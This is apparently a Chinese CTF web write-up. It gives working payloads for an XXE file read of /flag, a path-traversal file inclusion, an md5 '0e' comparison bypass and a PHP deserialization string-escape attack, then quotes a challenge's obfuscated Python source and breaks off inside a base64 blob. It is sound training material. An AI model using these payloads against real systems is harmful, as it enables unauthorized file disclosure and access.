<p>xml注入使用payload即可</p>
<pre class="language-none"><code class="language-none">xml_content&#x3D;%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C!DOCTYPE%20xxe%20%5B%3C!ELEMENT%20name%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%20%3E%5D%3E%3Cxml%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fxml%3E</code></pre>

<h1 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h1><p>CHALLENGE: 大海捞针<br>DESCRIPTION: 该死，之前的平行宇宙由于flag的泄露被一股神秘力量抹去，我们脱离了与那个宇宙的连接了！不过不用担心，看起来出题人傻乎乎的是具有泄露flag的概率的，我们只需要连接多个平行宇宙…（难道flag在多元宇宙里是全局变量吗）</p>
<p>tips:仅有这道题要用到扫描器，请不要将爆破速度调整过快，flag是一定能找到的<br>环境：<br><a target="_blank" rel="noopener" href="http://101.42.178.83:7771/">http://101.42.178.83:7771/</a></p>
<p>打开题目可见只需要bp跑一到一千的数字即可</p>
<pre class="language-none"><code class="language-none">use &#x2F;?id&#x3D;&lt;1-1000&gt; to connect to different parallel universes
</code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160340776.png" alt="image-20230907160340776" loading="lazy"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160551761.png" alt="image-20230907160551761" loading="lazy"></p>
<h1 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h1><p>CHALLENGE: meo图床<br>DESCRIPTION: 我们准备了一个meo(?)图床用于上传一些图片</p>
<pre class="language-none"><code class="language-none">可以直接上传php但是不进行解析，查看发现存在文件包含
</code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907162316680.png" alt="image-20230907162316680" loading="lazy"></p>
<pre class="language-none"><code class="language-none">读取这个发现如下提示
http:&#x2F;&#x2F;localhost:54781&#x2F;images.php?name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag

&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;</code></pre>

<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$param1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$param2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$param1</span> <span class="token operator">!==</span> <span class="token variable">$param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        
        <span class="token variable">$md5Param1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$md5Param2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5Param1</span> <span class="token operator">==</span> <span class="token variable">$md5Param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.O!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o??"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"o.O?"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o?"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>md50e进行绕过</p>
<pre class="language-none"><code class="language-none">param1&#x3D;QNKCDZO&amp;param2&#x3D;240610708</code></pre>

<h1 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h1><p>CHALLENGE: 夺命十三枪<br>DESCRIPTION: 夺命十三枪！然后是啥来着？</p>
<p>主页如下所示：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hanxin.exe.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'夺命十三枪'</span><span class="token punctuation">;</span>

<span class="token variable">$new_visitor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">(</span><span class="token variable">$Chant</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$before</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$new_visitor</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$after</span> <span class="token operator">=</span> <span class="token class-name static-context">Deadly_Thirteen_Spears</span><span class="token operator">::</span><span class="token function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$before</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Movements: '</span> <span class="token operator">.</span> <span class="token variable">$after</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>

<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$after</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Even Caused A Glitch..."</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>很明显是反序列化，根据代码还有一个’Hanxin.exe.php’页面</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Deadly_Thirteen_Spears</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Heartbreak"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Blind_Dragon"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_si_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Romantic_charm"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_wu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Peerless"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_liu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"White_Dragon"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_qi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Penetrating_Gaze"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_ba_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Kunpeng"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_jiu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Night_Parade_of_a_Hundred_Ghosts"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_shi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Overlord"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_shi_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Letting_Go"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_shi_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Decisive_Victory"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_shi_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Unrepentant_Lethality"</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token keyword">as</span> <span class="token variable">$index</span> <span class="token operator">=></span> <span class="token variable">$movement</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$move</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$chant</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Chant</span> <span class="token operator">=</span> <span class="token variable">$chant</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'MaoLei'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Far away from COOL...'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Omg You're So COOOOOL!!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>问题的关键，关键的问题，就很明显了，存在一个静态引用函数Make_a_Move()其中的</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">#存在反序列化字符串逃逸，不可控的后缀变的可控制</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">目的是在夺命十三枪后面修改为<span class="token string">";s:11:"</span>Spear_Owner<span class="token string">";s:6:"</span>MaoLei<span class="token string">";&#125;，该字符串长度为35，根据代码可以知道"</span>di_qi_qiang<span class="token string">" => "</span>Penetrating_Gaze<span class="token string">",刚好是从11->16，每次转换可以逃逸5个字符串，只需要重复7次"</span>di_qi_qiang<span class="token string">"即可完成逃逸



chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang"</span><span class="token punctuation">;</span>s:11:<span class="token string">"Spear_Owner"</span><span class="token punctuation">;</span>s:6:<span class="token string">"MaoLei"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p>CHALLENGE: signin<br>DESCRIPTION: 真的是signin（<br><strong>本题无需扫描器&#x2F;爆破</strong></p>
<p>题目代码:</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> users<span class="token punctuation">,</span> salt
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> json
<span class="token keyword">import</span> http<span class="token punctuation">.</span>server

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    FLAG <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>
        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>
    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

<span class="token keyword">assert</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> users
<span class="token keyword">assert</span> users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span>

hashed_users <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>gethash<span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span><span class="token operator">^</span><span class="token number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token string">"big"</span><span class="token punctuation">,</span>signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># what is it?</span>
    
<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ummm...? It looks like it's just base64 encoding it 5 times? truely?</span>
        <span class="token keyword">return</span> data

__page__ <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNW